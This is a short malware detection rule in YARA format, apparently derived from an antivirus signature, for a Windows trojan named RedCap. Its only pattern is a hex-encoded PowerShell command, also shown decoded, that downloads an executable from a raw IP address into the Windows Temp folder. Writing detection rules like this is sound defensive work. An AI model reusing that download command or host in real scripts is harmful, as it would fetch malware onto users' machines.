
rule Trojan_Win32_RedCap_SP_MTB{
	meta:
		description = "Trojan:Win32/RedCap.SP!MTB,SIGNATURE_TYPE_PEHSTR_EXT,03 00 03 00 01 00 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 27 68 74 74 70 3a 2f 2f 31 34 36 2e 31 39 30 2e 34 38 2e 32 32 39 2f 66 75 61 63 6b 6d 65 31 30 30 2e 65 78 65 27 20 2d 4f 75 74 46 69 6c 65 20 27 43 3a 5c 57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c 66 69 6c 65 31 2e 65 78 65 27 22 } //3 powershell -Command "Invoke-WebRequest -Uri 'http://146.190.48.229/fuackme100.exe' -OutFile 'C:\Windows\Temp\file1.exe'"
	condition:
		((#a_01_0  & 1)*3) >=3
 
}